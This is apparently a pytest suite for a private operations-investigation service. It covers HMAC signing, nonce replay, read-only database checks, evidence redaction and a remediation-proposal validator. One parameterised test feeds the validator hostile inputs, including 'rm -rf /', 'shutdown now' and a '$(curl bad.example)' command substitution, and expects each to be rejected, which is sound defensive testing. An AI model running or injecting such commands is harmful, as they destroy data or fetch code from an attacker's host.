"""Focused safety tests for the private Dash Ops process."""

from __future__ import annotations

import asyncio
import hashlib
import hmac
import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from fastapi import HTTPException
from pydantic import ValidationError
from starlette.requests import Request

from dash import internal_ops
from dash.ops_contract import OpsInvestigationRequest, RemediationProposal


SECRET = "test-secret-that-is-at-least-32-bytes-long"


def _empty_catalog() -> dict[str, Any]:
    return {"registry_version": "test-v1", "playbooks": []}


class FakeCursor:
    def __init__(self, *, one: Any = None, rows: list[Any] | None = None) -> None:
        self._one = one
        self._rows = rows or []

    async def fetchone(self) -> Any:
        return self._one

    async def fetchall(self) -> list[Any]:
        return self._rows


class FakeConnection:
    def __init__(self, cursors: list[FakeCursor]) -> None:
        self._cursors = list(cursors)
        self.calls: list[tuple[str, Any]] = []

    async def __aenter__(self) -> "FakeConnection":
        return self

    async def __aexit__(self, *_args: Any) -> None:
        return None

    async def execute(self, query: str, params: Any = None) -> FakeCursor:
        self.calls.append((query, params))
        return self._cursors.pop(0)


def _set_reader_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OPS_DB_HOST", "ops-db")
    monkeypatch.setenv("OPS_DB_PORT", "5432")
    monkeypatch.setenv("OPS_DB_USER", "dash_ops_reader")
    monkeypatch.setenv("OPS_DB_PASS", "reader-password")
    monkeypatch.setenv("OPS_DB_DATABASE", "ops")
    monkeypatch.setenv("OPENAI_API_KEY", "test-embedding-key")


def _signed_request(
    monkeypatch: pytest.MonkeyPatch,
    *,
    method: str,
    path: str,
    body: bytes,
    nonce: str,
) -> Request:
    monkeypatch.setenv("DASH_INTERNAL_API_SECRET", SECRET)
    timestamp = str(int(internal_ops.time()))
    canonical = b"\n".join([timestamp.encode(), nonce.encode(), method.upper().encode(), path.encode(), body])
    signature = hmac.new(SECRET.encode(), canonical, hashlib.sha256).hexdigest()
    headers = [
        (b"x-dash-timestamp", timestamp.encode()),
        (b"x-dash-nonce", nonce.encode()),
        (b"x-dash-signature", signature.encode()),
        (b"content-type", b"application/json"),
    ]
    sent = False

    async def receive() -> dict[str, Any]:
        nonlocal sent
        if sent:
            return {"type": "http.disconnect"}
        sent = True
        return {"type": "http.request", "body": body, "more_body": False}

    return Request(
        {
            "type": "http",
            "method": method,
            "path": path,
            "headers": headers,
            "query_string": b"",
            "scheme": "http",
            "server": ("dash-ops", 8001),
            "client": ("dockhand", 1234),
        },
        receive,
    )


def _evidence_row(
    *,
    payload: dict[str, Any] | None = None,
    expires_at: datetime | None = None,
    redacted: bool = True,
    content_hash: str | None = None,
) -> tuple[Any, ...]:
    evidence_payload = payload or {"records": [{"service": "web", "state": "running"}]}
    captured_at = datetime.now(UTC) - timedelta(seconds=30)
    observation_started_at = captured_at
    observation_ended_at = captured_at
    return (
        "ev_1",
        "runtime_snapshot",
        captured_at,
        expires_at or datetime.now(UTC) + timedelta(minutes=5),
        "dockhand.state_snapshots",
        "latest-per-host-v2",
        {"environment": None, "service": None},
        "dockhand-redaction-v1",
        "one canonical runtime snapshot",
        evidence_payload,
        observation_started_at,
        observation_ended_at,
        30,
        content_hash or internal_ops._payload_hash(evidence_payload),
        redacted,
        None,
        None,
    )


def test_public_agentos_does_not_mount_private_ops_or_ops_agents() -> None:
    public_source = (Path(__file__).parents[1] / "app" / "main.py").read_text(encoding="utf-8")
    private_source = (Path(__file__).parents[1] / "app" / "ops_main.py").read_text(encoding="utf-8")

    assert "dash.internal_ops" not in public_source
    assert "dash.agents_ops" not in public_source
    assert "ops_dash" not in public_source
    assert "dash.internal_ops" in private_source
    assert "agno" not in private_source.casefold()


def test_reader_configuration_never_falls_back_to_general_db_env(monkeypatch: pytest.MonkeyPatch) -> None:
    for name in internal_ops._REQUIRED_ENV:
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("DB_HOST", "writer-db")
    monkeypatch.setenv("DB_PORT", "5432")
    monkeypatch.setenv("DB_USER", "writer")
    monkeypatch.setenv("DB_PASS", "writer-password")
    monkeypatch.setenv("DB_DATABASE", "ops")

    with pytest.raises(internal_ops.OpsConfigurationError, match="missing explicit Ops reader"):
        internal_ops._reader_config()


def test_hmac_nonce_can_only_be_consumed_once(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(internal_ops, "_nonce_cache", internal_ops.NonceReplayCache(max_entries=10))
    request = _signed_request(
        monkeypatch,
        method="POST",
        path="/internal/ops/investigate",
        body=b"{}",
        nonce="0123456789abcdef0123456789abcdef",
    )

    async def exercise() -> None:
        await internal_ops._authenticate(request, b"{}")
        with pytest.raises(HTTPException) as replay:
            await internal_ops._authenticate(request, b"{}")
        assert replay.value.status_code == 409

    asyncio.run(exercise())


def test_invalid_signature_does_not_consume_nonce(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(internal_ops, "_nonce_cache", internal_ops.NonceReplayCache(max_entries=10))
    request = _signed_request(
        monkeypatch,
        method="POST",
        path="/internal/ops/investigate",
        body=b"{}",
        nonce="abcdef0123456789abcdef0123456789",
    )
    request.scope["headers"] = [
        (key, b"0" * 64 if key == b"x-dash-signature" else value) for key, value in request.scope["headers"]
    ]

    async def exercise() -> None:
        with pytest.raises(HTTPException) as invalid:
            await internal_ops._authenticate(request, b"{}")
        assert invalid.value.status_code == 401

        valid_request = _signed_request(
            monkeypatch,
            method="POST",
            path="/internal/ops/investigate",
            body=b"{}",
            nonce="abcdef0123456789abcdef0123456789",
        )
        await internal_ops._authenticate(valid_request, b"{}")

    asyncio.run(exercise())


def test_evidence_query_is_scoped_to_investigation(monkeypatch: pytest.MonkeyPatch) -> None:
    connection = FakeConnection([FakeCursor(rows=[_evidence_row()])])

    async def fake_connect() -> FakeConnection:
        return connection

    monkeypatch.setattr(internal_ops, "_connect", fake_connect)
    evidence = asyncio.run(internal_ops._load_evidence("inv_1", ["ev_1"]))

    assert [item.id for item in evidence] == ["ev_1"]
    assert connection.calls[0][1] == ("inv_1", ["ev_1"])
    assert "WHERE e.investigation_id = %s AND e.id = ANY(%s)" in connection.calls[0][0]


def test_cross_investigation_or_missing_evidence_fails_closed(monkeypatch: pytest.MonkeyPatch) -> None:
    connection = FakeConnection([FakeCursor(rows=[])])

    async def fake_connect() -> FakeConnection:
        return connection

    monkeypatch.setattr(internal_ops, "_connect", fake_connect)
    with pytest.raises(internal_ops.EvidenceValidationError, match="missing evidence in investigation scope"):
        asyncio.run(internal_ops._load_evidence("inv_wrong", ["ev_1"]))


@pytest.mark.parametrize(
    ("row", "message"),
    [
        (_evidence_row(redacted=False), "has not passed redaction"),
        (
            _evidence_row(expires_at=datetime.now(UTC) - timedelta(seconds=1)),
            "is expired",
        ),
        (_evidence_row(content_hash="0" * 64), "failed its content hash"),
        (
            _evidence_row(payload={"headers": {"Authorization": "Bearer live-token-123456789"}}),
            "failed its typed contract",
        ),
    ],
)
def test_untrusted_evidence_fails_closed(
    monkeypatch: pytest.MonkeyPatch,
    row: tuple[Any, ...],
    message: str,
) -> None:
    connection = FakeConnection([FakeCursor(rows=[row])])

    async def fake_connect() -> FakeConnection:
        return connection

    monkeypatch.setattr(internal_ops, "_connect", fake_connect)
    with pytest.raises(internal_ops.EvidenceValidationError, match=message):
        asyncio.run(internal_ops._load_evidence("inv_1", ["ev_1"]))


@pytest.mark.parametrize(
    "identity",
    [
        ("writer", "on", True),
        ("dash_ops_reader", "off", True),
        ("dash_ops_reader", "on", False),
    ],
)
def test_readiness_rejects_wrong_identity_transaction_or_schema(
    monkeypatch: pytest.MonkeyPatch,
    identity: tuple[str, str, bool],
) -> None:
    _set_reader_env(monkeypatch)
    connection = FakeConnection([FakeCursor(one=identity)])

    async def fake_connect() -> FakeConnection:
        return connection

    monkeypatch.setattr(internal_ops, "_connect", fake_connect)
    with pytest.raises(internal_ops.OpsReadinessError):
        asyncio.run(internal_ops._check_readiness())


def test_readiness_requires_tables_select_and_no_write_privileges(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _set_reader_env(monkeypatch)
    registrations = [(name, name) for name in internal_ops._REQUIRED_TABLES]
    privileges = [(name, True, False) for name in internal_ops._REQUIRED_TABLES]
    connection = FakeConnection(
        [
            FakeCursor(one=("dash_ops_reader", "on", True)),
            FakeCursor(rows=registrations),
            FakeCursor(rows=privileges),
            FakeCursor(
                one=(
                    "ready",
                    "text-embedding-3-small",
                    datetime.now(UTC),
                    3,
                    3,
                    None,
                    60,
                )
            ),
            FakeCursor(one=(3, 3)),
        ]
    )

    async def fake_connect() -> FakeConnection:
        return connection

    monkeypatch.setattr(internal_ops, "_connect", fake_connect)
    assert asyncio.run(internal_ops._check_readiness()) == "dash_ops_reader"


@pytest.mark.parametrize(
    "index_status",
    [
        None,
        ("failed", "text-embedding-3-small", datetime.now(UTC), 3, 3, "failure", 60),
        ("ready", "wrong-model", datetime.now(UTC), 3, 3, None, 60),
        ("ready", "text-embedding-3-small", datetime.now(UTC), 3, 2, None, 60),
        ("ready", "text-embedding-3-small", datetime.now(UTC), 3, 3, None, 7_201),
    ],
)
def test_readiness_fails_closed_on_missing_stale_or_incomplete_hybrid_index(
    monkeypatch: pytest.MonkeyPatch,
    index_status: tuple[Any, ...] | None,
) -> None:
    _set_reader_env(monkeypatch)
    registrations = [(name, name) for name in internal_ops._REQUIRED_TABLES]
    privileges = [(name, True, False) for name in internal_ops._REQUIRED_TABLES]
    connection = FakeConnection(
        [
            FakeCursor(one=("dash_ops_reader", "on", True)),
            FakeCursor(rows=registrations),
            FakeCursor(rows=privileges),
            FakeCursor(one=index_status),
        ]
    )

    async def fake_connect() -> FakeConnection:
        return connection

    monkeypatch.setattr(internal_ops, "_connect", fake_connect)
    with pytest.raises(internal_ops.OpsReadinessError, match="hybrid retrieval"):
        asyncio.run(internal_ops._check_readiness())


def _proposal(**overrides: Any) -> dict[str, Any]:
    proposal: dict[str, Any] = {
        "proposal_type": "job",
        "job_kind": "restart_service",
        "playbook_id": "test.restart-service",
        "playbook_version": "1",
        "arguments": {"service": "web", "replicas": 1},
        "risk_class": "R1",
        "target_environment": "non-production",
        "preconditions": ["service is degraded"],
        "evidence_ids": ["ev_1"],
        "evidence_max_age_seconds": 300,
        "rollback_steps": ["restore prior replica count"],
        "postconditions": ["service is healthy"],
    }
    proposal.update(overrides)
    return proposal


def test_contract_rejects_unknown_fields() -> None:
    with pytest.raises(ValidationError, match="extra_forbidden"):
        OpsInvestigationRequest(
            investigation_id="inv_1",
            prompt="investigate web",
            unexpected="silently ignored fields are unsafe",  # type: ignore[call-arg]
        )


@pytest.mark.parametrize(
    "arguments",
    [
        {"payload": {"command": "rm -rf /"}},
        {"payload": {"value": "rm -rf /"}},
        {"safe": [{"nested_script": "shutdown now"}]},
        {"operation": "restart", "value": "$(curl bad.example)"},
    ],
)
def test_contract_rejects_nested_arbitrary_execution(arguments: dict[str, Any]) -> None:
    with pytest.raises(ValidationError, match="forbidden"):
        RemediationProposal.model_validate(_proposal(arguments=arguments))


def test_contract_accepts_non_executable_typed_arguments() -> None:
    proposal = RemediationProposal.model_validate(_proposal())
    assert proposal.arguments == {"service": "web", "replicas": 1}


def test_shadow_investigation_never_returns_hypotheses_or_proposals(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(internal_ops, "_nonce_cache", internal_ops.NonceReplayCache(max_entries=10))
    payload = {
        "investigation_id": "inv_1",
        "prompt": "investigate web",
        "evidence_ids": [],
        "proposal_catalog": _empty_catalog(),
    }
    body = json.dumps(payload, separators=(",", ":"), sort_keys=True).encode()
    request = _signed_request(
        monkeypatch,
        method="POST",
        path="/internal/ops/investigate",
        body=body,
        nonce="11111111111111111111111111111111",
    )

    result = asyncio.run(internal_ops.investigate(request))
    assert result.confidence == 0.0
    assert result.hypotheses == []
    assert result.remediation_proposals == []


def test_shadow_investigation_returns_grounded_rules_but_never_proposals(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(internal_ops, "_nonce_cache", internal_ops.NonceReplayCache(max_entries=10))
    now = datetime.now(UTC)
    evidence_payload = {"event": {"action": "oom", "exit_code": 137}}
    evidence = internal_ops._evidence_from_row(
        (
            "ev_oom",
            "docker_event",
            now - timedelta(seconds=30),
            now + timedelta(minutes=5),
            "dockhand.event_projector",
            "docker-event-v1",
            {"environment": "production", "service": "web"},
            "dockhand-redaction-v1",
            "canonical OOM event",
            evidence_payload,
            now - timedelta(seconds=30),
            now - timedelta(seconds=30),
            30,
            internal_ops._payload_hash(evidence_payload),
            True,
            "production",
            "web",
        ),
        now=now,
        expected_scope=("production", "web"),
    )

    async def fake_load_evidence(*_args: Any, **_kwargs: Any) -> list[Any]:
        return [evidence]

    async def fake_comparables(*_args: Any, **_kwargs: Any) -> tuple[list[Any], list[Any]]:
        return [], []

    monkeypatch.setattr(internal_ops, "_load_evidence", fake_load_evidence)
    monkeypatch.setattr(internal_ops, "_load_historical_comparables", fake_comparables)
    payload = {
        "investigation_id": "inv_oom",
        "prompt": "investigate web OOM",
        "environment": "production",
        "service": "web",
        "evidence_ids": ["ev_oom"],
        "proposal_catalog": _empty_catalog(),
    }
    body = json.dumps(payload, separators=(",", ":"), sort_keys=True).encode()
    request = _signed_request(
        monkeypatch,
        method="POST",
        path="/internal/ops/investigate",
        body=body,
        nonce="22222222222222222222222222222222",
    )

    result = asyncio.run(internal_ops.investigate(request))

    assert result.confidence == 0.98
    assert result.hypotheses[0].evidence_ids == ["ev_oom"]
    assert "root_cause=container_oom" in result.hypotheses[0].statement
    assert result.remediation_proposals == []
